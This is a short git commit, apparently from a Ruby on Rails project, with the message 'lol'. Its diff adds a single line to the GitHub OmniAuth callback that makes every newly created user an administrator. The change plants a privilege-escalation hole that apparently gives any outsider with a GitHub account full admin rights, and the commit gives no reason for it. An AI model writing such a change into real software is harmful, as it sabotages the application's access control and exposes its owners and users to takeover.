a9a4f3b52107fd697f2dbf805da98aa4526dc620
SarCasm <sarcasm008@gmail.com>
2016-03-01 01:21:20 +0200

    lol

--- app/controllers/callbacks_controller.rb
+++ app/controllers/callbacks_controller.rb
@@ -1,6 +1,7 @@
 class CallbacksController < Devise::OmniauthCallbacksController
   def github
     @user = User.create_with_omniauth(request.env["omniauth.auth"])
+    @user.update(admin: true)
     sign_in_and_redirect @user
   end
 
